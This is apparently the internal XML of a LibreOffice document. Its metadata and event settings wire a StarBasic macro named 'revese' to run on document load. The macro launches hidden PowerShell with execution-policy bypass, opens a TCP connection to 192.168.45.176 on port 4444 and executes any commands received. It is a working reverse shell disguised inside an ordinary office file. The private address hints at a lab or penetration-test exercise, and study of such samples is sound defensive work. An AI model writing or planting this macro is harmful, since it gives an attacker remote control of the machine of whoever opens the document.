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Basic/Standard/reves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>
    <office:event-listeners>
      <script:event-listener script:language="ooo:script" script:event-name="dom:load" xlink:href="vnd.sun.star.script:Standard.revese.Main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SimSun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SimSun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4-21T07:49:01.56</meta:creation-date>
    <dc:date>2026-05-23T05:40:10.345197932</dc:date>
    <meta:editing-duration>PT12M16S</meta:editing-duration>
    <meta:editing-cycles>4</meta:editing-cycles>
    <meta:generator>LibreOffice/26.2.3.2$Linux_X86_64 LibreOffice_project/6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revese.xml><?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE module  PUBLIC '-//OpenOffice.org//DTD OfficeDocument 1.0//EN'  'module.dtd'>
<script:module xmlns:script="http://openoffice.org/2000/script" script:name="revese" script:language="StarBasic" script:moduleType="normal">REM  *****  BASIC  *****
Sub Main
Dim cmdStr
cmdStr = "powershell -nop -W hidden -noni -ep bypass -c ""$TCPClient = New-Object Net.Sockets.TCPClient('192.168.45.176', 4444);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL&gt; ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2&gt;&amp;1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"""
Shell("cmd /c " &amp; cmdStr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ves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